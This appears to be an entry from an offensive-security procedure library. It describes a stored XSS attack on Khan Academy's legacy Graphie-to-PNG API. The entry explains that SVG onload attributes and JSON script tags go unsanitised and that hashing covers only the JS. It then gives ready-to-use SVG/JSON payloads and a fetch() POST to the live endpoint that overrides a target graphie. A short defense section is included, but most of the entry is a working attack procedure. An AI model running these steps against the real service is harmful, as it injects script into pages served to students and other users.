---
tags:
  - xss
  - upload
  - svg
  - json
  - api-exploit
type: procedure
tools:
  - '[[tools/Fetch-API]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/upload-malicious-graphie-fetch]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:20.699Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 92d6ad5c-8c26-4d83-bab7-fe5969acbf76
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Upload-Malicious-Graphie-via-Legacy-API

## Summary

This procedure exploits the legacy Graphie to PNG API by uploading SVG and JSON files with XSS payloads, leveraging JS-only hashing to override legitimate graphies and inject malicious code.

## Description

The Khan Academy Graphie renderer processes uploaded JS, SVG, and JSON for image generation. Due to insufficient sanitization, SVG onload attributes and JSON script tags (with typesetAsMath: false) allow direct DOM injection. Hashing considers only JS, enabling overrides. This leads to XSS on pages rendering the graphie via CDNs like cdn.kastatic.org.

## Requirements

1. Browser with JavaScript enabled and access to public API endpoints (e.g., http://graphie-to-png.kasandbox.org/)
2. Original JS from a target graphie for hash matching
3. No authentication required
4. Knowledge of target graphie hashes

## Defense

Defensive measures and detection strategies:

- Implement full input validation and sanitization for SVG (strip onload) and JSON (escape scripts)
- Hash all components (JS + SVG + JSON) to prevent overrides
- Monitor API uploads for anomalous payloads (e.g., script tags)
- Use CSP to block inline scripts on rendering pages

## Objectives

1. Upload malicious files to override a target graphie
2. Inject XSS payload for DOM execution
3. Enable arbitrary JS on affected Khan Academy pages

## Instructions

### Step 1: Prepare Malicious Payloads

**Context**: Craft SVG with onload XSS and JSON with script tag to bypass math typesetting.

Define variables:

```javascript
const ORIGINAL_JS = 'legitimate graphie JS code here'; // From target graphie
const XSS_SVG = '<svg onload="alert(\'XSS\')"></svg>'; // Malicious SVG
const XSS_JSON = {content: '<script>alert(\'DOM XSS\')</script>', typesetAsMath: false};
```

> Prepares payloads for upload; ensures hash matches via original JS.

### Step 2: Execute Upload

**Context**: Send FormData via POST to API endpoint using [[commands/upload-malicious-graphie-fetch]].

**Command** ([[commands/upload-malicious-graphie-fetch]]):

```javascript
var form = new FormData();
form.append("js", ORIGINAL_JS);
form.append("svg", XSS_SVG);
form.append("other_data", JSON.stringify(XSS_JSON));
await fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body": form }).then(r => r.text())
```

> Submits payloads; expected output is server response with hash/URL. Success if no errors and response indicates processing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/upload-malicious-graphie-fetch]]

## Tools Used

- [[tools/Fetch-API]]

## Tags

- xss
- upload
- api-exploit
